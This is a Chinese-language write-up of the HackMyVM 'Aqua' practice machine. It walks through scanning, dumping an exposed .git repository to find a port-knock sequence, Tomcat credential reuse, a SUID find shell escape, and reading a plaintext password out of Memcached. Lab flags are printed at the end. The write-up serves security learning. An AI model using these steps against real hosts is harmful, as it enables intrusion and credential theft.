---
title: hackmyvm Aqua靶机复盘
author: LingMj
data: 2025-01-25
categories: [hackmyvm]
tags: [ftp,knock,git,Memcached]
description: 难度-Medium
---

## 网段扫描
```
└─# arp-scan -l
Interface: eth0, type: EN10MB, MAC: 00:0c:29:df:e2:a7, IPv4: 192.168.56.110
WARNING: Cannot open MAC/Vendor file ieee-oui.txt: Permission denied
WARNING: Cannot open MAC/Vendor file mac-vendor.txt: Permission denied
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.56.1    0a:00:27:00:00:15       (Unknown: locally administered)
192.168.56.100  08:00:27:76:81:d6       (Unknown)
192.168.56.101  08:00:27:ca:ae:52       (Unknown)

3 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 1.862 seconds (137.49 hosts/sec). 3 responded
```

## 端口扫描

```
└─# nmap -p- -sC -sV 192.168.56.101
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-24 22:55 EST
Nmap scan report for 192.168.56.101
Host is up (0.0094s latency).
Not shown: 65530 closed tcp ports (reset)
PORT     STATE    SERVICE VERSION
21/tcp   filtered ftp
22/tcp   open     ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 00:11:32:04:42:e0:7f:98:29:7c:1c:2a:b8:a7:b0:4a (RSA)
|   256 9c:92:93:eb:1c:8f:84:c8:73:af:ed:3b:65:09:e4:89 (ECDSA)
|_  256 a8:5b:df:d0:7e:31:18:6e:57:e7:dd:6b:d5:89:44:98 (ED25519)
80/tcp   open     http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Todo sobre el Agua
|_http-server-header: Apache/2.4.29 (Ubuntu)
8009/tcp open     ajp13   Apache Jserv (Protocol v1.3)
|_ajp-methods: Failed to get a valid response for the OPTION request
8080/tcp open     http    Apache Tomcat 8.5.5
|_http-favicon: Apache Tomcat
|_http-title: Apache Tomcat/8.5.5
MAC Address: 08:00:27:CA:AE:52 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 56.57 seconds
```

## 获取webshell

>所获信息看出21端口是关闭的，我们可能需要knock开门，看一下web
>
![图 1](../assets/images/036f26dec9e1ad02f2e747d32b60492e0dbf84f78865e72592ea6776fbd338bd.png)  
![图 0](../assets/images/b6ecf10b116c343926111b3756c5aeb699d5abe9fac597ca23c15130266ac2f5.png)  
![图 2](../assets/images/3b0d23b8dd56a4cc59086cbdbef55f5d873ba1445a15fed137217380be168678.png)  
![图 3](../assets/images/fd32b6824de18c9baee7c62098b727093d4b798d17f4f6ae0e5ba67064e0c2cb.png)  
![图 4](../assets/images/5cf68622fb0fcd07486492a3b41d0223fc9d9ef9cb379ed62fb51f9009fd19f7.png)  

>找到登录路口，可以尝试一下
>
![图 5](../assets/images/d39ce98689374a7bb38e93cea5b5d6b6e6544de6df6bdfb0dcd3411468edb146.png)  
![图 6](../assets/images/425f7c420a129a9f4663e25653454b86db7d4ffb19a22162bd8ced11b15e18ad.png)  
![图 7](../assets/images/76cfd7e705819dc5094e68dffc1d4e50b5023cce56cb46d783f9e069dd434715.png)  
![图 8](../assets/images/5b0cf867b4f0c8bf93d22523cfea9727f8a4cc7332232eff63526321e1eb82bf.png)  

>无果,感觉不一定是爆破，先扫一下80目录
>
![图 10](../assets/images/1c48db4e40ab688bac5a7bd3fd0be7c4182c2085bfbf23f0fb7226e251cd96c6.png)  

![图 9](../assets/images/6da329332213fb6ba23eee36d4ac095f4d442a1758d0fd6d6a0854b1b735cc5a.png)  
![图 11](../assets/images/ca8eb87fc53cd13cc18dcd1fe9f9b640965fa24961b37a3c8965edd9dec6a3b2.png)  
![图 12](../assets/images/b4e4d3410ee1bce65dee696a9654b17dc4a5afcb1f3da422b9242dc2d839dad4.png)  
![图 13](../assets/images/4b4acd3cf9571cc6d75a1ceb1081d8d0fd0a3384103c3870431f2ee73b0fff56.png)  

>这里有出现密码的zip，但是还是需要去整理一下
>
![图 14](../assets/images/85ce640c53d49c44114fde40565fb77459e5c8d4c89689485926a754e11422df.png)  
![图 15](../assets/images/10dc11c17723b5b88a4af2c31016a98432efeccd5036f42b6f131cc0f541aae2.png)  
![图 16](../assets/images/a0921013276d7ce63975b7f5ccd1621e0feb10d9a03a4f83b20e9c0d4f54455f.png)  

>豁还有一个登录地方
![图 17](../assets/images/e9f117a08cc128ccfb11a357917ad581e3552f289c73c9a5ae6f5f9d9fe25d69.png)  

>无sql注入
>
![图 18](../assets/images/e248d14f6ff795c81a8ec2d231de0d77672a362af83fec30ce9d3abb855c82f6.png)  
![图 19](../assets/images/34eaec4c0973a372463b2b4a486ff7752d0cdbeb01965d561bff07dad8297dc5.png)  
![图 20](../assets/images/f7cc7870e1fa00135443833d4df2eaa4bcdc42d47fbfbd177d62db37670ff047.png)  
![图 21](../assets/images/abec62f915b3b36b9232eaab935400fac6d2d00748764be1d5254c341b759229.png)  

>看看图片隐写
>
![图 22](../assets/images/e96d4b1f892a1e79887f63b03742e273aba22ba9a6160b0d7b15cd82433d7b06.png)  
![图 24](../assets/images/e8d3db2e6a7ba034ff6cfcbc07b1b83efcadfdb8158df70ba95256494ce84799.png)  
![图 25](../assets/images/f0f15f5baa85741d2fbc059298249cc43aa6d75723b98b214bf13aeaf2be111f.png)  

>换个工具获得新东西，.git泄露
>
![图 26](../assets/images/9fb9a52ac21b89dddd0380abed1b670efb6b509d7ece50ecf11d16dbf04bdca6.png)  

```
└─# python3 GitHack.py http://192.168.56.101/SuperCMS/.git/
[+] Download and parse index file ...
[+] README.md
[+] css/main.css
[+] img/img.jpg
[+] index.html
[+] js/login.js
[+] login.html
[OK] index.html
[OK] js/login.js
[OK] css/main.css
[OK] README.md
[OK] login.html
[OK] img/img.jpg
                                                                                                                                                                                                                
┌──(root㉿LingMj)-[/home/lingmj/xxoo1/GitHack-master]
└─# ls -al
total 32
drwxr-xr-x  4 root root 4096 Jan 24 23:53 .
drwxr-xr-x 11 root root 4096 Jan 24 23:52 ..
drwxr-xr-x  5 root root 4096 Jan 24 23:53 192.168.56.101
-rw-r--r--  1 root root 4789 May  9  2022 GitHack.py
-rw-r--r--  1 root root 1172 May  9  2022 README.md
-rw-r--r--  1 root root  620 Jan 24 23:53 index
drwxr-xr-x  3 root root 4096 Jan 24 23:52 lib
                                                                                                                                                                                                                
┌──(root㉿LingMj)-[/home/lingmj/xxoo1/GitHack-master]
└─# mv 1mv 192.168.56.101 /home/lingmj/xxoo
```

>上面那个版本的git不行换一个
>
![图 27](../assets/images/5fd1dac6ec68b9463c7328ac172393e02db81dcc3e38dc3073dc7dff5e3c9a2a.png)  


```
└─# python2 GitHack.py http://192.168.56.101/SuperCMS/.git

  ____ _ _   _   _            _
 / ___(_) |_| | | | __ _  ___| | __
| |  _| | __| |_| |/ _` |/ __| |/ /
| |_| | | |_|  _  | (_| | (__|   <
 \____|_|\__|_| |_|\__,_|\___|_|\_\{0.0.5}
 A '.git' folder disclosure exploit.

[*] Check Depends
[+] Check depends end
[*] Set Paths
[*] Target Url: http://192.168.56.101/SuperCMS/.git/
[*] Initialize Target
[*] Try to Clone straightly
[*] Clone
Cloning into '/home/lingmj/xxoo/GitHack-master/dist/192.168.56.101'...
fatal: repository 'http://192.168.56.101/SuperCMS/.git/' not found
[-] Clone Error
[*] Try to Clone with Directory Listing
[*] http://192.168.56.101/SuperCMS/.git/ is support Directory Listing
[*] Initialize Git
[!] Initialize Git Error: hint: Using 'master' as the name for the initial branch. This default branch name
hint: is subject to change. To configure the initial branch name to use in all
hint: of your new repositories, which will suppress this warning, call:
hint: 
hint:   git config --global init.defaultBranch <name>
hint: 
hint: Names commonly chosen instead of 'master' are 'main', 'trunk' and
hint: 'development'. The just-created branch can be renamed via this command:
hint: 
hint:   git branch -m <name>

[*] ?C=N;O=D
[*] ?C=M;O=A
[*] ?C=S;O=A
[*] ?C=D;O=A
[*] Try to clone with Cache
[*] Cache files
[*] packed-refs
[*] config
[*] HEAD
[*] COMMIT_EDITMSG
[*] ORIG_HEAD
[*] FETCH_HEAD
[*] refs/heads/master
[*] refs/remote/master
[*] index
[*] logs/HEAD
[*] refs/heads/main
[*] logs/refs/heads/main
[*] Fetch Commit Objects
[*] objects/2e/6cd2656d4e343dbcbc0e59297b9b217656c3a4
[*] objects/85/8e9f9a555b69355c6653fdbaf8313f5544b87b
[*] objects/c3/e76fb1f1bd32996e2549c699b0a4fa528e9a0d
[*] objects/3c/8d5a0eaa9166c7a39c4258f4e978c87ef7b59a
[*] objects/ef/130734c271906490f05c27856388adda62d193
[*] objects/65/e1413b82d1d648982030df2f0a074ab0b2fb0f
[*] objects/f2/ddc62d2c28669444fe6a75aae0f8a1e8a394e3
[*] objects/b3/bf4c0c41c0143d95f04daf4175eb5d72bd571f
[*] objects/86/c7d4bceaf2426b8455112a1fb74096efcc492d
[*] objects/29/631d6592a6d1ff54af273019fdc44798ae610f
[*] objects/ac/5bbd68afc5dc0d528f8e72daf14ab547c4b55a
[*] objects/0a/7f7bae77fbceffca773318badf380fde0b7e41
[*] objects/e7/2325e80888de98eab14cda8fb9d1dc3ffd0b2d
[*] objects/54/e7fc341e5aa8ecea353afa46de20d43ac7f2cd
[*] objects/7c/c5ddf306d952dad4291e6c63cc8452cae63235
[*] objects/f1/59677b7a6fb9090d9f8ba957e7e8a46f5b6df3
[*] objects/71/fcf328b4e83b72fee21decc2f370cef8646a0f
[*] objects/05/8c2c1ec60f3215de4cd2d0158d4c6a22682928
[*] objects/8c/b735a8c51987448f9386406933d0a147a1cb3f
[*] objects/62/096efb6acc0e9c2d64b01d6bdc963f2081912d
[*] objects/de/4b7e451460cae16556cc786fe812155a992087
[*] objects/3b/7e4b8bb0eeb8557fc3ab0b9e7acec16431150a
[*] objects/bd/5a878c5ffeb9125035ed7633d564b9a26e877c
[*] objects/9e/9757718772d622ed20b58f5445cb11d6015f79
[*] objects/58/afe63a1cd28fa167b95bcff50d2f6f011337c1
[*] objects/48/831280c8857ae4f644321279d4a6dc6aec79af
[*] objects/7b/1614729157e934673b9b90ac71a2007cbf2190
[*] objects/84/cdd811cbe5c10d9306017ef009a22833c02069
[*] Fetch Commit Objects End
[*] logs/refs/remote/master
[*] logs/refs/stash
[*] refs/stash
[*] Valid Repository
[+] Valid Repository Success

[+] Clone Success. Dist File : /home/lingmj/xxoo/GitHack-master/dist/192.168.56.101
```
```
└─# cat HEAD   
ref: refs/heads/main
                                                                                                                                                                                                                
┌──(root㉿LingMj)-[/home/…/GitHack-master/dist/192.168.56.101/.git]
└─# cd refs/heads 
                                                                                                                                                                                                                
┌──(root㉿LingMj)-[/home/…/192.168.56.101/.git/refs/heads]
└─# ls -al 
total 12
drwxr-xr-x 2 root root 4096 Jan 25 00:06 .
drwxr-xr-x 5 root root 4096 Jan 25 00:06 ..
-rw-r--r-- 1 root root   41 Jan 25 00:06 main
                                                                                                                                                                                                                
┌──(root㉿LingMj)-[/home/…/192.168.56.101/.git/refs/heads]
└─# cat cat main    
2e6cd2656d4e343dbcbc0e59297b9b217656c3a4
                                                                                                                                                                                                                
┌──(root㉿LingMj)-[/home/…/192.168.56.101/.git/refs/heads]
└─# cd ..        
                                                                                                                                                                                                                
┌──(root㉿LingMj)-[/home/…/dist/192.168.56.101/.git/refs]
└─# cd ..
                                                                                                                                                                                                                
┌──(root㉿LingMj)-[/home/…/GitHack-master/dist/192.168.56.101/.git]
└─# cd ..
                                                                                                                                                                                                                
┌──(root㉿LingMj)-[/home/…/xxoo/GitHack-master/dist/192.168.56.101]
└─# git git checkout 2e6cd2656d4e343dbcbc0e59297b9b217656c3a4
Note: switching to '2e6cd2656d4e343dbcbc0e59297b9b217656c3a4'.

You are in 'detached HEAD' state. You can look around, make experimental
changes and commit them, and you can discard any commits you make in this
state without impacting any branches by switching back to a branch.

If you want to create a new branch to retain commits you create, you may
do so (now or later) by using -c with the switch command. Example:

  git switch -c <new-branch-name>

Or undo this operation with:

  git switch -

Turn off this advice by setting config variable advice.detachedHead to false

HEAD is now at 2e6cd26 Add files via upload
                                                                                                                                                                                                                
┌──(roo
```
```
└─# git log --oneline
2e6cd26 (HEAD, origin/main, main) Add files via upload
c3e76fb Delete login.html
ac5bbd6 Update index.html
f159677 Update README.md
8cb735a Add files via upload
3b7e4b8 Delete knocking_on_Atlantis_door.txt
58afe63 Create knocking_on_Atlantis_door.txt
7b16147 Initial commit
                                                                                                                                                                                                                
┌──(root㉿LingMj)-[/home/…/xxoo/GitHack-master/dist/192.168.56.101]
└─# git checkout 58afe63 -- knocking_on_Atlantis_door.txt
                                                                                                                                                                                                                
┌──(root㉿LingMj)-[/home/…/xxoo/GitHack-master/dist/192.168.56.101]
└─# ls -al
total 40
drwxr-xr-x 6 root root 4096 Jan 25 00:12 .
drwxr-xr-x 3 root root 4096 Jan 25 00:06 ..
drwxr-xr-x 9 root root 4096 Jan 25 00:12 .git
-rw-r--r-- 1 root root   37 Jan 25 00:06 README.md
drwxr-xr-x 2 root root 4096 Jan 25 00:06 css
drwxr-xr-x 2 root root 4096 Jan 25 00:06 img
-rw-r--r-- 1 root root  799 Jan 25 00:06 index.html
drwxr-xr-x 2 root root 4096 Jan 25 00:06 js
-rw-r--r-- 1 root root   94 Jan 25 00:12 knocking_on_Atlantis_door.txt
-rw-r--r-- 1 root root 1878 Jan 25 00:06 login.html
                                                                                                                                                                                                                
┌──(root㉿LingMj)-[/home/…/xxoo/GitHack-master/dist/192.168.56.101]
└─# cat knocking_on_Atlantis_door.txt 
Para abrir  las puertas esta es la secuencia
(☞ﾟヮﾟ)☞ 1100,800,666 ☜(ﾟヮﾟ☜)
                                                                                                                                                                                                                
┌──(root㉿LingMj)-[/home/…/xxoo/GitHack-master/dist/192.168.56.101]
└─# 
```

![图 28](../assets/images/59cdd3a3b966c39eae7be912c3f3bba4682c9778a409f9e479bc3aae09b53686.png)  
![图 29](../assets/images/d499463ae37fae417b9ed9c3a732bbbc173d104a482af887a017c60dec09b2ce.png)  

>我对git不是很了解，所以利用一下gtp进行操作一下，知道了knock需要进行的端口
>
![图 30](../assets/images/3659264a7d7157771607c801b46234206424d21cd505439629c1387967811059.png)  

>这里我没安装需要先安装一下
>
![图 31](../assets/images/60129e003855d801d82bb6b186eeecbfa2bc0cfd30758f810d79d13b7016301b.png)  
![图 32](../assets/images/5436f14c13be260b4441626c62a88d66f3709452ab3703a6fe092d22aa66ed51.png)
![图 34](../assets/images/f1c8b199ac2b58dd68e07ca4a6b21e63da45791f697e8c13cc9531dad2010d87.png)  
![图 33](../assets/images/1cccd60ec81a0614ce406cc66d35fa3b7547c2fcc901eabd678adb7e3bbe1b9b.png)  
![图 35](../assets/images/0d4e52f9736c21c0c6f6a8a20859b04a97d6f682a61a97c326d32de8aa857538.png)  

>利用zip提示我们需要密码，可以考虑一下之前的提示 1=2 = passwd_zip
>
![图 36](../assets/images/937adb833ae6a8ca6c5bab961142d83eb129bb9506c09e44992665f865d71996.png)  

>所以密码应该为agua=H2O
>
![图 37](../assets/images/9b59edbf17f98b3a91b7748b6de388d7bc4fe6a6a4e7988625d4c97ba14961e3.png)  

>解压成功
>
![图 38](../assets/images/dfd48e8b9c1128f80972acae54f7785ad6cc4b9db3a0332a425908efae9d8633.png)  

>存在tomcat用户密码
>
![图 39](../assets/images/ae6398878ed9d6ec38043ab7b4f779280f5130c3e09b500515988ae47a167430.png)  
![图 40](../assets/images/243be9467c08f43e16e642fba6639dd0c84984cd9fcd27f84ad973ea3b2b8179.png)  
![图 41](../assets/images/f2da12f5ccc3a926a7307f77e67401a0f28f20b8a26307885d6cd60c01b8f793.png)  

>需要war的文件，发现reverse存在编写
>
![图 43](../assets/images/7b7f1c87d0baa5b2453ec74913c84c05252f79d3bba9b45716df97f85f4044d4.png)  
![图 42](../assets/images/c694965a2934c0a1b8c2437d1faa322020c53bc8b289d0e92768e4e389a4a43b.png)  
![图 44](../assets/images/c066eb52d6b7679e68c537018972642041c93c27bc070ec08ca9b46ec43187c4.png)  


## 提权
```
cat .bash_history
sudo -l
ps aux
nc 127.0.0.1 11211
su tridente
cd
ll
ls -la
cd conf
ls
cat tomcat-users.xml 
exit
reset
export TERM=xterm
export SHELL=bash
stty rows 51 columns 238
nano
id
ls -la
cd home
ls .lka
ls .la
ls -la
cd tridente
ls -al
cat user.txt 
.find
./find
./find . -exec /bin/bash \; -quit
ls
exit
reset
export TERM=xterm
export SHELL=bash
stty rows 37 columns 165
ls -la
cd home
ls
cd tridente/
ls -la
./find
./find . -exec /bin/sh \; -quit
sudo -l
ls
cat user.txt 
cat .bash_history
ps aux
nc 127.0.0.1 11211
su tridente
su tridente
exit
reset xterm
export TERM=xterm
export SHELL=bash
stty rows 57 columns 212
nano
stty rows 42 columns 159
nano
ls -la
cd home
ls -la
sudo -l
cd tridente
ls -la
find . -exec /bin/sh \; -quit
ls -la
cd /
find / -perm -4000 2>/dev/null
COMMAND=whoami
echo "$COMMAND" | at now
sh
ls -al
ls
ps aux
nc localhost 11211
```
>这里已经完成了大部分解，但是没有说明密码，我们需要去寻找一下
>
![图 45](../assets/images/4f8cfb3f9be801d7c9e6ee6ac10e25bd35ff3d3ac1ebb1625e815e40a2c01209.png)  
![图 46](../assets/images/716ff9a49b4cbb56b7adc481a226eea40fad3bd71da2cda77b0d8a58e45fc6ea.png)  
![图 47](../assets/images/345ca6f0adef571d370edbafc8e7b0ff2d8231f7dc1f7cc26e69eb2e4af5c4f1.png)  
![图 48](../assets/images/42d23ea9843d87c62757700354682be8e29acdd48537a4e34b2051728523fd86.png)  

![图 49](../assets/images/8504dd59c1ad77e224648ad878ae47ecfa83962b683d1a3908a9c79a69e1bfdd.png)  
![图 50](../assets/images/467deedb31fd00d8b0f20b8f99015982d0b8225d79408ef18e4b0126dbf387b6.png)  



```
stats cachedump
CLIENT_ERROR bad command line
stats items
STAT items:1:number 5
STAT items:1:number_hot 1
STAT items:1:number_warm 0
STAT items:1:number_cold 4
STAT items:1:age_hot 0
STAT items:1:age_warm 0
STAT items:1:age 0
STAT items:1:evicted 0
STAT items:1:evicted_nonzero 0
STAT items:1:evicted_time 0
STAT items:1:outofmemory 0
STAT items:1:tailrepairs 0
STAT items:1:reclaimed 0
STAT items:1:expired_unfetched 0
STAT items:1:evicted_unfetched 0
STAT items:1:evicted_active 0
STAT items:1:crawler_reclaimed 0
STAT items:1:crawler_items_checked 80
STAT items:1:lrutail_reflocked 0
STAT items:1:moves_to_cold 53758
STAT items:1:moves_to_warm 0
STAT items:1:moves_within_lru 0
STAT items:1:direct_reclaims 0
STAT items:1:hits_to_hot 0
STAT items:1:hits_to_warm 0
STAT items:1:hits_to_cold 0
STAT items:1:hits_to_temp 0
END
stats cachedump 1 0
ITEM id [4 b; 0 s]
ITEM email [17 b; 0 s]
ITEM Name [14 b; 0 s]
ITEM password [18 b; 0 s]
ITEM username [8 b; 0 s]
END
```

```
get username
VALUE username 0 8
tridente
END
get password
VALUE password 0 18
N3ptun0D10sd3lM4r$
END
```
![图 51](../assets/images/ad68ebcf277e7c5cf42c19761b6d8d2dfde39f8495ef0fdb0c07d3d726aaec10.png)  

![图 52](../assets/images/10fb23ba9185f95a8f5a00f53a3ac89aee22985fe8d8904b1f0e7f2cbef097ed.png)  
![图 53](../assets/images/dff76f65f95e929d4871af7542fb73c246cbc4d45f83d040b3e03bb7c00eaa9c.png)  
![图 54](../assets/images/0ba999b0595faead8f48f2d5dd060be9c319e5b0ab6a51dcacdbd1a0d62eae50.png)  

>还整个gpg无语
>
![图 55](../assets/images/89f0e6f63d849ce379bee5bb738eac66335ba906e4afd4030087a7d787725266.png)  
![图 56](../assets/images/defe138314ece807831c565efd88f46087a51a2869fdded1d5e7e13cb793e03c.png)  
![图 57](../assets/images/bf3dec29e272badb3cec491cca6f1b6b304d6179e04826c851d7d6e0dd9e1e83.png)  

>好了靶场结束
>

>userflag:f506a6ee37275430ac07caa95914aeba
>
>rootflag:e16957fbc9202932b1dc7fe3e10a197e
>